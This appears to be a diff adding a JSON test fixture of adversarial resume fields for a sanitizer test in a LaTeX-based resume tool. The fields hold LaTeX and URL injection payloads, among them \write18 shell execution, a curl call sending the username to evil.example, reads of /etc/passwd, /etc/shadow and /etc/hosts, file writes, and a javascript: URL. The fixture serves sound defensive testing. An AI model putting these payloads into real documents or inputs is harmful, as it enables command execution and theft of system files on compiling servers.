@@ -1,0 +1,33 @@
+{
+  "_comment": "Adversarial fixture. Every field here is what a prompt-injected LLM or a poisoned scrape might produce. None of it may execute; all of it must typeset as literal text. See packages/core/test/sanitize.test.ts.",
+  "basics": {
+    "name": "\\input{/etc/passwd}",
+    "email": "a@b.com\\write18{id > /tmp/pwned}",
+    "phone": "100% \\& more #1 ~tilde ^caret _under",
+    "website": "javascript:alert(1)",
+    "location": {
+      "address": "\\immediate\\write18{curl http://evil.example/$(whoami)}"
+    }
+  },
+  "work": [
+    {
+      "company": "\\catcode`\\@=11 \\def\\x{danger}",
+      "position": "{\\bf injected}",
+      "startDate": "2020",
+      "endDate": "2024",
+      "highlights": [
+        "\\openin1=/etc/hosts \\read1 to \\line \\line",
+        "Used $100 & saved 50% of #budget",
+        "\\newwrite\\out \\openout\\out=/tmp/escape.txt"
+      ]
+    }
+  ],
+  "projects": [
+    {
+      "name": "Path traversal probe",
+      "description": "\\include{../../../../etc/shadow}",
+      "url": "file:///etc/passwd"
+    }
+  ],
+  "selectedTemplate": 1
+}
